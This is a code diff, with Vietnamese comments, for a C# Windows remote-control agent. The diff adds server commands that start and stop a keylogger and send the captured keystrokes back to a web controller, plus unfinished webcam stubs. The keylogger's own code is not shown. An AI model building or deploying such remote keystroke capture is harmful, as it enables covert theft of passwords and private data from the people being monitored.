@@ -6,20 +6,21 @@ using System.IO;
 using System.Text;
 using System.Windows.Forms;
 using Microsoft.Win32; // Thư viện cần thiết để đọc Registry (List App)
+using System.Timers;
+using System.Runtime.InteropServices;
+
 namespace WindowsAgent
 {
     public class Feature
     {
         // --- HÀM ĐIỀU PHỐI LỆNH ---
+        private KeyLoggerService _keyLogger = new KeyLoggerService();
         public string ProcessCommand(string cmd)
         {
             try
             {
                 switch (cmd)
                 {
-
-                    // ... các case cũ ...
-
                     // THÊM ĐOẠN NÀY:
                     case "REGISTERED_OK":
                         // Server xác nhận kết nối, Agent không cần làm gì, trả về rỗng để không gửi lại gì cả
@@ -49,6 +50,25 @@ namespace WindowsAgent
                         // Chỉ tắt phần mềm Agent này thôi
                         Application.Exit();
                         return "LOG: Agent disconnecting...";
+                    case "CMD_CAM_ON":
+                        // Bật camera (chưa làm)
+                        return "LOG: Chức năng camera chưa được triển khai.";
+                    case "CMD_CAM_OFF":
+                        // Tắt camera (chưa làm)
+                        return "LOG: Chức năng camera chưa được triển khai.";
+                    case "CMD_KEYLOG_START":
+                        _keyLogger.Start();
+                        return "LOG: Keylogger đã được bật.";
+
+                    case "CMD_KEYLOG_STOP":
+                        _keyLogger.Stop();
+                        return "LOG: Keylogger đã dừng.";
+
+                    case "CMD_KEYLOG_GET":
+                        // Lấy dữ liệu từ file và trả về cho Web
+                        string logs = _keyLogger.GetAndClearLogs();
+                        if (string.IsNullOrEmpty(logs)) return "LOG: Chưa có dữ liệu phím nào.";
+                        return "KEYLOG_DATA:" + logs; 
 
                     default:
                         return "LOG: Lệnh không xác định (" + cmd + ")";
@@ -59,6 +79,8 @@ namespace WindowsAgent
                 return "ERROR: Lỗi khi thực thi lệnh. Chi tiết: " + ex.Message;
             }
         }
+
+       
 
         // --- 1. LOGIC LẤY DANH SÁCH TIẾN TRÌNH (Running Processes) ---
         private string GetRunningProcesses()
@@ -151,6 +173,11 @@ namespace WindowsAgent
             psi.CreateNoWindow = true;
             psi.UseShellExecute = false;
             Process.Start(psi);
+        }
+
+        private void WebCamOn()
+        {
+            // Chưa triển khai
         }
     }
 }
